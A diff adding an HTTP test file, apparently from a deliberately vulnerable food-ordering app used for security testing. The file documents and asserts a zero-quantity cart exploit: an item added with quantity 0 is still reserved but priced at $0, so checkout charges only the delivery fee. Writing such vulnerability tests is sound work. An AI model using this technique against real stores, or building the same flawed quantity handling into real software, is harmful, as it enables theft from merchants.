@@ -1,0 +1,63 @@
+# @import ../_imports.http
+
+# POST /cart/{id}/items vulnerability test - Zero Quantity Free Items (v402 ONLY)
+# CRITICAL: This tests the vulnerability that exists in v402 and MUST be excluded in v403
+#
+# The Exploit:
+# 1. Create a cart for Krusty Krab
+# 2. Add item with quantity: 0
+# 3. Reservation loop adds one item (breaks when quantity <= 1, but adds first)
+# 4. Price calculation multiplies by quantity (0), so subtotal is $0
+# 5. Checkout pays only delivery fee (if any)
+#
+# The vulnerability: Reservation system reserves items one-at-a-time but the
+# loop condition (quantity <= 1) breaks AFTER adding the first item, while
+# price calculation multiplies by the original quantity value (0).
+
+### Setup - seed balance and create cart
+# @name setup_zero_qty
+{{
+  await platform.seed({ plankton: 200 });
+}}
+# @tag cart, r04, v402, vulnerable
+POST /cart?restaurant_id=1
+Authorization: {{auth.basic("plankton")}}
+
+@cart_id = {{$(response).field("cart_id")}}
+?? js $(response).status() == 201
+
+### Add item with quantity 0 - item appears but price is $0
+# @name add_zero_quantity
+# @forceRef setup_zero_qty
+# @tag cart, r04, v402, vulnerable
+POST /cart/{{cart_id}}/items
+Authorization: {{auth.basic("plankton")}}
+Content-Type: application/json
+
+{"item_id": "{{menu.item("Krabby Patty").id}}", "quantity": 0}
+
+# EXPLOIT: Item is added to cart (reservation loop adds at least one)
+?? js $(response).isOk() == true
+?? js $(response).field("items").length == 1
+?? js $(response).field("items")[0].name == Krabby Patty
+
+# EXPLOIT: Quantity is 0 but item was added to cart
+# The price field shows unit price, not line total (price * qty)
+?? js $(response).field("items")[0].quantity == 0
+
+### Checkout - verify total is $0 or near-zero
+# @name checkout_free
+# @forceRef add_zero_quantity
+# @tag cart, r04, v402, vulnerable
+POST /cart/{{cart_id}}/checkout
+Authorization: {{auth.basic("plankton")}}
+Content-Type: application/json
+
+{"delivery_address": "Chum Bucket", "tip": 0}
+
+# EXPLOIT: Order completes - total is ONLY the $5 delivery fee!
+# Items are effectively free because price * 0 = $0
+?? js $(response).status() == 201
+?? js $(response).hasFields("order_id", "total", "items") == true
+?? js $(response).field("items").length == 1
+?? js $(response).total() == 5
